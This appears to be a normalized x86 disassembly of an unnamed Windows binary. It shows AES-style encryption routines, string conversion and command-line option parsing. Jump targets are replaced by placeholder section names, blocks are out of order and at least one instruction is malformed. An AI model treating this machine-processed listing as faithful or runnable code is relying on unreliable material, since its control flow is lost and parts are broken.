sub_401000
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov ebx [ esi + 0x20 ]
mov eax edx
mov edx 0x10
sub edx ebx
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ebx
mov [ ecx ] 0x0
test ebx ebx
je r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
test edx edx
je r-xdata
cmp ebx 0x10
jb r-xdata
cmp [ esi + 0x24 ] 0x1
jne r-xdata
mov edi [ ebp + 0xc ]
push edx
lea eax [ esi + 0x10 ]
add eax ebx
push edi
push eax
call sub_406550
add [ esi + 0x20 ] ebx
mov eax [ ebp - 0x8 ]
mov ebx [ ebp + 0x10 ]
sub ebx eax
add esp 0xc
add edi eax
mov eax [ ebp - 0x4 ]
jmp r-xdata
test ebx ebx
je r-xdata
lea ebx [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
shr eax 0x4
mov [ ebp - 0x4 ] eax
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ esi + 0x10 ]
push eax
push [ esi + 0x2c ]
mov eax [ esi + 0x28 ]
call eax
add esp 0xc
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax [ esi ]
xor [ esi + 0x10 ] eax
mov eax [ esi + 0x4 ]
xor [ esi + 0x14 ] eax
mov eax [ esi + 0x8 ]
xor [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
xor [ esi + 0x1c ] eax
cmp [ esi + 0x20 ] 0x10
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] ebx
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x20 ]
push ebx
add eax 0x10
add eax esi
push edi
push eax
call sub_406550
add esp 0xc
add [ esi + 0x20 ] ebx
mov eax [ ebp + 0x10 ]
lea edi [ ebx - 0x8 ]
movq xmm0 [ eax ]
movq [ edi ] xmm0
movq xmm0 [ eax + 0x8 ]
movq [ edi + 0x8 ] xmm0
cmp [ esi + 0x24 ] 0x1
jne r-xdata
cmp [ esi + 0x24 ] 0x1
mov eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
xor [ ecx ] eax
mov eax [ esi + 0x4 ]
xor [ ecx + 0x4 ] eax
mov eax [ esi + 0x8 ]
xor [ ecx + 0x8 ] eax
mov eax [ esi + 0xc ]
xor [ ecx + 0xc ] eax
mov eax [ esi + 0x28 ]
push edi
push edi
push [ esi + 0x2c ]
call eax
add esp 0xc
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax [ esi ]
xor [ edi ] eax
mov eax [ esi + 0x4 ]
xor [ ebx - 0x4 ] eax
mov eax [ esi + 0x8 ]
xor [ ebx ] eax
mov eax [ esi + 0xc ]
xor [ ebx + 0x4 ] eax
movq xmm0 [ esi + 0x10 ]
movq [ esi ] xmm0
movq xmm0 [ esi + 0x18 ]
movq xmm0 [ eax ]
movq [ esi ] xmm0
movq xmm0 [ eax + 0x8 ]
jmp r-xdata
cmp [ esi + 0x24 ] 0x1
jne r-xdata
mov eax [ esi ]
xor [ edi ] eax
mov eax [ esi + 0x4 ]
xor [ ebx - 0x4 ] eax
mov eax [ esi + 0x8 ]
xor [ ebx ] eax
mov eax [ esi + 0xc ]
xor [ ebx + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
movq [ esi + 0x8 ] xmm0
add [ ecx ] 0x10
add eax 0x10
mov [ esi + 0x20 ] 0x0
mov edi [ ebp + 0x10 ]
movq xmm0 [ edi ]
movq [ esi ] xmm0
movq xmm0 [ edi + 0x8 ]
movq xmm0 [ edi ]
movq [ esi ] xmm0
movq xmm0 [ edi + 0x8 ]
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub [ ebp - 0x8 ] 0x10
add [ ecx ] 0x10
add edi 0x10
add ebx 0x10
dec [ ebp - 0x4 ]
movq [ esi + 0x8 ] xmm0
mov [ ebp + 0x10 ] edi
jne r-xdata
sub_4011e0
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x38 ]
push edi
lea edi [ edx + 0x4 ]
shl edi 0x4
add edi ebx
movzx eax [ edi + esi * 2 ]
lea edx [ edi + esi * 2 ]
add edx esi
movzx ecx [ edx ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + esi ]
shl ecx 0x8
or ecx eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
xor [ ebx + 0x24 ] ecx
movzx eax [ edi + esi * 2 + 0x1 ]
movzx ecx [ edx + 0x1 ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + esi + 0x1 ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + 0x1 ]
shl ecx 0x8
or ecx eax
xor [ ebx + 0x28 ] ecx
movzx eax [ edi + esi * 2 + 0x2 ]
movzx ecx [ edx + 0x2 ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + esi + 0x2 ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + 0x2 ]
shl ecx 0x8
or ecx eax
xor [ ebx + 0x2c ] ecx
movzx eax [ edi + esi * 2 + 0x3 ]
movzx ecx [ edx + 0x3 ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + esi + 0x3 ]
shl ecx 0x8
or ecx eax
movzx eax [ edi + 0x3 ]
shl ecx 0x8
pop edi
or ecx eax
xor [ ebx + 0x30 ] ecx
pop esi
pop ebx
retn
sub_401290
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx ecx
push esi
mov ecx [ ebx + 0x34 ]
mov eax [ ebx + 0x3c ]
inc ecx
imul ecx [ ebx + 0x38 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
mov esi eax
cmp eax ecx
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea edi [ ebx + 0x40 ]
add ebx 0x40
lea edi [ edi + eax * 4 ]
nop
cmp [ ebp - 0x4 ] 0x6
jle r-xdata
ror ecx 0x8
mov edx ecx
shr ecx 0x10
and ecx 0xff
mov eax edx
movzx ecx [ ecx + r--data ]
shr eax 0x18
movzx eax [ eax + r--data ]
shl eax 0x8
or ecx eax
mov eax edx
shr eax 0x8
and eax 0xff
shl ecx 0x8
movzx eax [ eax + r--data ]
or ecx eax
movzx eax dl
shl ecx 0x8
movzx eax [ eax + r--data ]
or ecx eax
mov eax [ ebp - 0x8 ]
xor ecx [ eax * 4 + r--data ]
jmp r-xdata
mov eax [ ebx ]
xor eax ecx
mov [ edi ] eax
inc esi
add ebx 0x4
add edi 0x4
cmp esi [ ebp - 0xc ]
jl r-xdata
cmp edx 0x4
jne r-xdata
mov eax esi
cdq
idiv [ ebp - 0x4 ]
mov ecx [ edi - 0x4 ]
mov [ ebp - 0x8 ] eax
test edx edx
jne r-xdata
pop edi
mov eax ecx
shr eax 0x10
and eax 0xff
movzx edx [ eax + r--data ]
mov eax ecx
shr eax 0x18
movzx eax [ eax + r--data ]
shl eax 0x8
or edx eax
mov eax ecx
shr eax 0x8
and eax 0xff
shl edx 0x8
movzx eax [ eax + r--data ]
or edx eax
movzx eax cl
shl edx 0x8
movzx ecx [ eax + r--data ]
or ecx edx
sub_4013a0
push esi
mov esi ecx
mov ecx [ esi ]
mov eax ecx
shr eax 0x10
and eax 0xff
movzx edx [ eax + r--data ]
mov eax ecx
shr eax 0x18
movzx eax [ eax + r--data ]
shl eax 0x8
or edx eax
mov eax ecx
shr eax 0x8
and eax 0xff
shl edx 0x8
movzx eax [ eax + r--data ]
or edx eax
movzx eax cl
shl edx 0x8
movzx eax [ eax + r--data ]
or edx eax
mov [ esi ] edx
mov edx [ esi + 0x4 ]
mov eax edx
shr eax 0x10
and eax 0xff
movzx ecx [ eax + r--data ]
mov eax edx
shr eax 0x18
movzx eax [ eax + r--data ]
shl eax 0x8
or ecx eax
shl ecx 0x8
mov eax edx
shr eax 0x8
and eax 0xff
movzx eax [ eax + r--data ]
or ecx eax
shl ecx 0x8
movzx eax dl
mov edx [ esi + 0x8 ]
movzx eax [ eax + r--data ]
or ecx eax
mov [ esi + 0x4 ] ecx
mov eax edx
shr eax 0x10
and eax 0xff
movzx ecx [ eax + r--data ]
mov eax edx
shr eax 0x18
movzx eax [ eax + r--data ]
shl eax 0x8
or ecx eax
mov eax edx
shr eax 0x8
and eax 0xff
shl ecx 0x8
movzx eax [ eax + r--data ]
or ecx eax
movzx eax dl
mov edx [ esi + 0xc ]
movzx eax [ eax + r--data ]
shl ecx 0x8
or ecx eax
mov eax edx
shr eax 0x10
and eax 0xff
mov [ esi + 0x8 ] ecx
movzx ecx [ eax + r--data ]
mov eax edx
shr eax 0x18
movzx eax [ eax + r--data ]
shl eax 0x8
or ecx eax
mov eax edx
shr eax 0x8
and eax 0xff
shl ecx 0x8
movzx eax [ eax + r--data ]
or ecx eax
movzx eax dl
shl ecx 0x8
movzx eax [ eax + r--data ]
or ecx eax
mov [ esi + 0xc ] ecx
pop esi
retn
sub_4014e0
push ebp
mov ebp esp
sub esp 0x8
lea eax [ ecx + 0xc ]
mov [ ebp - 0x4 ] eax
movzx eax [ eax ]
push ebx
mov ebx [ eax * 4 + r--data ]
movzx eax [ ecx + 0x4 ]
lea edx [ ecx + 0x8 ]
mov [ ebp - 0x8 ] edx
movzx edx [ edx ]
push esi
xor ebx [ edx * 4 + r--data ]
push edi
xor ebx [ eax * 4 + r--data ]
movzx eax [ ecx ]
lea edi [ ecx + 0x4 ]
xor ebx [ eax * 4 + r--data ]
lea esi [ ecx + 0x1 ]
mov [ ecx ] bl
mov ecx [ ebp - 0x8 ]
mov eax ebx
shr eax 0x8
mov [ edi ] al
mov eax ebx
shr eax 0x10
mov [ ecx ] al
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
shr ebx 0x18
mov [ eax - 0x1 ] bl
movzx eax [ eax ]
inc ecx
mov edx [ eax * 4 + r--data ]
movzx eax [ edi + 0x1 ]
mov ebx ecx
movzx ecx [ ebx ]
xor edx [ ecx * 4 + r--data ]
xor edx [ eax * 4 + r--data ]
movzx eax [ esi ]
xor edx [ eax * 4 + r--data ]
mov [ esi ] dl
mov eax edx
shr eax 0x8
mov [ edi + 0x1 ] al
mov eax edx
shr eax 0x10
mov [ ebx ] al
mov eax [ ebp - 0x4 ]
inc eax
shr edx 0x18
mov [ eax - 0x1 ] dl
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x4 ] eax
movzx eax [ eax ]
mov edx [ eax * 4 + r--data ]
xor edx [ ecx * 4 + r--data ]
movzx eax [ edi + 0x2 ]
xor edx [ eax * 4 + r--data ]
movzx eax [ esi + 0x1 ]
xor edx [ eax * 4 + r--data ]
mov [ esi + 0x1 ] dl
mov eax edx
shr eax 0x8
mov [ edi + 0x2 ] al
mov eax edx
shr eax 0x10
mov [ ebx + 0x1 ] al
mov eax [ ebp - 0x4 ]
shr edx 0x18
mov [ eax ] dl
movzx ecx [ ebx + 0x2 ]
inc eax
mov [ ebp - 0x4 ] eax
movzx eax [ eax ]
mov edx [ eax * 4 + r--data ]
movzx eax [ edi + 0x3 ]
xor edx [ ecx * 4 + r--data ]
xor edx [ eax * 4 + r--data ]
movzx eax [ esi + 0x2 ]
xor edx [ eax * 4 + r--data ]
mov [ esi + 0x2 ] dl
mov eax edx
shr eax 0x8
mov [ edi + 0x3 ] al
mov eax edx
shr eax 0x10
mov [ ebx + 0x2 ] al
mov eax [ ebp - 0x4 ]
pop edi
shr edx 0x18
pop esi
mov [ eax ] dl
pop ebx
mov esp ebp
pop ebp
retn
sub_401630
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebx + 0x34 ]
push edi
lea esi [ ebx + 0x24 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
xor edi edi
mov edx edi
mov ecx edi
and edx 0x3
sar ecx 0x2
inc edi
lea eax [ edx + ecx * 4 ]
lea ecx [ ecx + edx * 4 ]
mov al [ eax + ebx ]
mov [ ecx + esi ] al
cmp edi 0x10
jl r-xdata
mov edi [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
mov edx edi
mov ecx ebx
call sub_4011e0
dec edi
test edi edi
jle r-xdata
mov eax [ esi + 0x4 ]
rol eax 0x8
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
rol eax 0x10
mov [ esi + 0x8 ] eax
mov eax [ esi + 0xc ]
ror eax 0x8
mov ecx esi
mov [ esi + 0xc ] eax
call sub_4013a0
xor edx edx
mov ecx ebx
call sub_4011e0
mov ebx [ ebp + 0x10 ]
xor edi edi
jmp r-xdata
mov edx edi
mov ecx edi
and edx 0x3
sar ecx 0x2
inc edi
lea eax [ ecx + edx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov al [ eax + esi ]
mov [ ecx + ebx ] al
cmp edi 0x10
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
rol eax 0x8
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
rol eax 0x10
mov [ esi + 0x8 ] eax
mov eax [ esi + 0xc ]
ror eax 0x8
mov ecx esi
mov [ esi + 0xc ] eax
call sub_4013a0
mov edx edi
mov ecx ebx
call sub_4011e0
mov ecx esi
call sub_4014e0
dec edi
test edi edi
jg r-xdata
sub_401710
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov esi ecx
push 0x240
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] esi
call sub_4040b9
mov ebx eax
mov ecx 0x90
mov edi ebx
[ edi ] [ esi ]
mov edi [ ebp - 0x8 ]
add esp 0x4
mov esi [ edi ]
test esi esi
je r-xdata
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov esi edi
lea ecx [ esi + 0x2 ]
mov ecx esi
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov ecx esi
mov edx eax
lea eax [ ecx + 0x2 ]
add esp 0x4
mov [ ebx ] edx
mov [ ebp - 0x8 ] eax
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi ecx
sar esi 0x1
add esi 0x3
lea eax [ esi + esi ]
push eax
call sub_4040b9
push edi
push r--data
push esi
push eax
mov [ ebx + 0x10 ] eax
call sub_40414b
add esp 0x14
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov ecx esi
mov edi eax
add esp 0x4
mov [ ebx + 0xc ] edi
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x8 ]
push esi
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edx
call sub_4042aa
add esp 0xc
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi ecx
sar esi 0x1
inc esi
push esi
call sub_4040b9
add esp 0x4
mov edi eax
push 0x0
push 0x0
push esi
push edi
push 0xffffffff
push [ ebx + 0x10 ]
mov [ ebx + 0x14 ] edi
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push esi
lea eax [ ecx + 0x1 ]
push eax
push edi
call sub_4042aa
mov eax [ ebp - 0x4 ]
add esp 0xc
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
call sub_404081
add esp 0x4
mov [ ebx + 0x14 ] 0x0
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
mov edx edi
sar ecx 0x1
lea esi [ edx + 0x2 ]
lea esp [ esp ]
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
sub edx esi
sar edx 0x1
lea esi [ ecx + 0x4 ]
add esi edx
lea eax [ esi + esi ]
push eax
call sub_4040b9
mov ecx [ ebp - 0x4 ]
push edi
push [ ecx ]
mov [ ebx + 0x10 ] eax
push r--data
push esi
push eax
call sub_40414b
add esp 0x18
jmp r-xdata
mov esi [ ebx + 0x10 ]
lea ecx [ esi + 0x2 ]
sub_4018e0
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
test edi edi
je r-xdata
test esi esi
je r-xdata
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp [ edi ] ebx
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push edi
call sub_404081
add esp 0x4
pop ebx
mov esi edi
lea ebx [ ebx ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax ]
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x8 ] edi
cmp [ eax ] edi
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
push [ eax + 0x18 ]
call sub_404081
mov edi [ ebp - 0x10 ]
add esp 0x4
xor ebx ebx
lea esp [ esp ]
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x18 ]
mov eax [ ebx + eax ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push [ eax + ebx ]
call sub_404081
mov eax [ esi ]
inc edi
mov eax [ eax + 0x18 ]
lea ebx [ edi * 4 ]
add esp 0x4
cmp [ ebx + eax ] 0x0
mov [ ebp - 0x8 ] edi
jne r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x18 ]
mov eax [ eax + ebx ]
push [ eax + 0x4 ]
call sub_404081
add esp 0x4
xor edi edi
lea esp [ esp ]
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
push [ esi ]
call sub_404081
inc ebx
add esp 0x4
cmp [ edi + ebx * 4 ] 0x0
lea esi [ edi + ebx * 4 ]
mov [ ebp - 0xc ] ebx
jne r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ ebx + eax ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ esi ]
mov eax [ eax + 0x18 ]
mov eax [ eax + ebx ]
mov eax [ eax + 0x4 ]
mov eax [ edi + eax ]
mov eax [ eax ]
test eax eax
je r-xdata
push eax
call sub_404081
add esp 0x4
push esi
call sub_404081
add esp 0x4
push eax
call sub_404081
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x18 ]
mov eax [ eax + ebx ]
mov eax [ eax + 0x4 ]
push [ eax + edi ]
call sub_404081
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
inc ecx
mov eax [ eax + ebx ]
lea edi [ ecx * 4 ]
mov eax [ eax + 0x4 ]
add esp 0x4
cmp [ edi + eax ] 0x0
mov [ ebp - 0x4 ] ecx
jne r-xdata
push eax
call sub_404081
add esp 0x4
mov eax [ edi + eax ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x8 ]
sub_401b00
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
test edx edx
je r-xdata
push ebx
push esi
push edi
mov edi [ eax + 0x18 ]
xor esi esi
test edi edi
je r-xdata
lea eax [ esi * 4 + 0x8 ]
push eax
call sub_4040b9
mov ebx eax
mov eax [ ebp - 0x4 ]
add esp 0x4
mov [ eax + 0x18 ] ebx
test esi esi
je r-xdata
cmp [ edi ] esi
je r-xdata
push 0x8
call sub_4040b9
lea edi [ esi * 4 ]
mov esi [ ebp - 0x8 ]
mov ecx esi
xorps xmm0 xmm0
mov [ edi + ebx ] eax
add esp 0x4
movq [ eax ] xmm0
lea edx [ ecx + 0x2 ]
mov edi edi
mov ecx [ edi ]
xor esi esi
test ecx ecx
je r-xdata
mov eax edi
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov ecx [ edi + ebx ]
add esp 0x4
mov [ ecx ] eax
mov ecx esi
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
push edi
call sub_404081
add esp 0x4
xor eax eax
nop
lea eax [ eax + 0x4 ]
inc esi
cmp [ eax ] 0x0
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push esi
lea eax [ ecx + 0x1 ]
push eax
mov eax [ edi + ebx ]
push [ eax ]
call sub_4042aa
mov eax [ ebp - 0x4 ]
add esp 0xc
mov eax [ eax + 0x18 ]
mov [ eax + edi + 0x4 ] 0x0
pop edi
pop esi
pop ebx
inc esi
mov [ eax + ebx ] ecx
lea eax [ esi * 4 ]
mov ecx [ eax + edi ]
test ecx ecx
jne r-xdata
sub_401c10
push ebp
mov ebp esp
push ecx
mov eax edx
mov [ ebp - 0x4 ] eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
mov ecx [ ecx + 0x18 ]
test ecx ecx
je r-xdata
push edi
xor edi edi
cmp [ ecx ] edi
je r-xdata
pop edi
mov eax ecx
lea eax [ eax + 0x4 ]
inc edi
cmp [ eax ] 0x0
jne r-xdata
test edi edi
je r-xdata
mov edi [ ecx + edi * 4 - 0x4 ]
test edi edi
je r-xdata
push ebx
mov ebx [ edi + 0x4 ]
push esi
xor esi esi
test ebx ebx
je r-xdata
lea eax [ esi * 4 + 0x8 ]
push eax
call sub_4040b9
add esp 0x4
mov [ edi + 0x4 ] eax
test esi esi
je r-xdata
cmp [ ebx ] esi
je r-xdata
push 0xc
lea ebx [ esi * 4 ]
call sub_4040b9
mov ecx [ edi + 0x4 ]
mov esi [ ebp - 0x4 ]
mov [ ebx + ecx ] eax
add esp 0x4
lea ecx [ esi + 0x2 ]
jmp r-xdata
mov ecx [ ebx ]
xor esi esi
test ecx ecx
je r-xdata
mov eax ebx
nop
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
push ebx
call sub_404081
add esp 0x4
xor edx edx
lea ebx [ ebx ]
lea eax [ eax + 0x4 ]
inc esi
cmp [ eax ] 0x0
jne r-xdata
sub esi ecx
sar esi 0x1
inc esi
lea eax [ esi + esi ]
push eax
call sub_4040b9
mov ecx [ edi + 0x4 ]
push [ ebp - 0x4 ]
mov ecx [ ebx + ecx ]
push esi
mov [ ecx ] eax
mov eax [ edi + 0x4 ]
mov eax [ ebx + eax ]
push [ eax ]
call sub_4042aa
push esi
call sub_4040b9
mov ecx [ edi + 0x4 ]
add esp 0x14
mov ecx [ ebx + ecx ]
push 0x0
mov [ ecx + 0x4 ] eax
mov eax [ edi + 0x4 ]
push 0x0
mov eax [ ebx + eax ]
push esi
push [ eax + 0x4 ]
push 0xffffffff
push [ eax ]
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edx + eax ] ecx
lea edx [ esi * 4 ]
mov ecx [ edx + ebx ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x4 ]
pop esi
mov ecx [ ebx + eax ]
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ ebx + eax + 0x4 ] 0x0
pop ebx
mov eax [ edi + 0x4 ]
mov eax [ ebx + eax ]
push [ eax + 0x4 ]
call sub_404081
mov eax [ edi + 0x4 ]
add esp 0x4
mov eax [ ebx + eax ]
mov [ eax + 0x4 ] 0x0
sub_401d90
push ebp
mov ebp esp
sub esp 0x678
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
mov eax ecx
push edi
push 0x1c
mov esi edx
mov [ ebp - 0x670 ] eax
mov [ eax ] 0x0
call sub_4040b9
mov edi eax
xorps xmm0 xmm0
movq [ edi ] xmm0
movq [ edi + 0x8 ] xmm0
add esp 0x4
movq [ edi + 0x10 ] xmm0
lea eax [ ebp - 0x660 ]
mov [ edi + 0x18 ] 0x0
push eax
mov [ ebp - 0x664 ] edi
mov [ esi ] edi
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov [ ebp - 0x668 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x660 ] 0x0
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
push 0x20a
call sub_4040b9
add esp 0x4
mov [ edi ] eax
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
mov [ edi + 0x18 ] 0x0
mov ebx [ ebp - 0x660 ]
xor edx edx
test ebx ebx
jle r-xdata
mov eax [ edi + 0x18 ]
lea esi [ eax * 4 + 0x4 ]
push esi
call sub_4040b9
push esi
mov ebx eax
push 0x0
push ebx
mov [ ebp - 0x674 ] ebx
call sub_406ba0
mov ecx [ ebp - 0x670 ]
push 0x240
lea eax [ ebp - 0x24c ]
push 0x0
push eax
mov [ ecx ] ebx
mov [ ebp - 0x670 ] 0x0
call sub_406ba0
mov edx [ ebp - 0x660 ]
mov ebx [ ebp - 0x248 ]
add esp 0x1c
xor esi esi
test edx edx
jle r-xdata
lea esi [ edx + 0x1 ]
nop
test ebx ebx
je r-xdata
lea esp [ esp ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x674 ]
sar ecx 0x1
cmp ecx 0x2
jne r-xdata
mov ecx [ ebp - 0x670 ]
mov edx edi
lea ecx [ ebp - 0x24c ]
call sub_401710
mov ecx [ ebp - 0x670 ]
mov edx [ ebp - 0x674 ]
inc ecx
mov [ edx + ecx * 4 - 0x4 ] eax
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x66c ]
sar ecx 0x1
cmp ecx 0x2
jne r-xdata
mov edi [ ebp - 0x664 ]
cmp [ edi ] 0x2d
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x2
call sub_4040b9
push r--data
push 0x1
push eax
mov [ edi + 0x4 ] eax
call sub_4042aa
add esp 0x10
mov eax [ ebp - 0x674 ]
mov [ eax + ecx * 4 ] 0x0
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x664 ]
cmp [ edi ] 0x2d
jne r-xdata
mov eax [ ebp - 0x668 ]
mov edi [ eax + edx * 4 ]
mov ecx edi
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x674 ] eax
movzx eax [ edi + 0x2 ]
cmp eax 0x63
jne r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
push [ edi + 0x4 ]
lea eax [ ebp - 0x454 ]
push 0x104
push eax
call sub_4042aa
lea eax [ ebp - 0x454 ]
push 0x2e
push eax
call sub_404198
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
mov eax [ ebp - 0x668 ]
mov edi [ eax + esi * 4 ]
mov ecx edi
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x66c ] eax
movzx eax [ edi + 0x2 ]
add eax 0xffffff9d
cmp eax 0x14
ja r-xdata
cmp eax 0x6d
jne r-xdata
inc edx
inc esi
push [ ebp - 0x668 ]
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_404072
mov esp ebp
pop ebp
retn
push 0x2
call sub_4040b9
push r--data
push 0x1
push eax
mov [ edi + 0xc ] eax
call sub_4042aa
add esp 0x10
push esi
lea eax [ ebp - 0x214 ]
push 0x104
push eax
call sub_4042aa
xor eax eax
mov [ esi ] ax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x454 ]
push eax
push r--data
lea eax [ ebp - 0x65c ]
push 0x104
push eax
call sub_40414b
lea esi [ ebp - 0x65c ]
add esp 0x20
lea ecx [ esi + 0x2 ]
lea ecx [ ebp - 0x454 ]
lea edx [ ecx + 0x2 ]
movzx eax [ eax + lookup_table_4023f0 ]
jmp [ eax * 4 + jump_table_4023bc ]
mov edi [ ebp - 0x664 ]
cmp esi ebx
jge r-xdata
mov ax [ esi ]
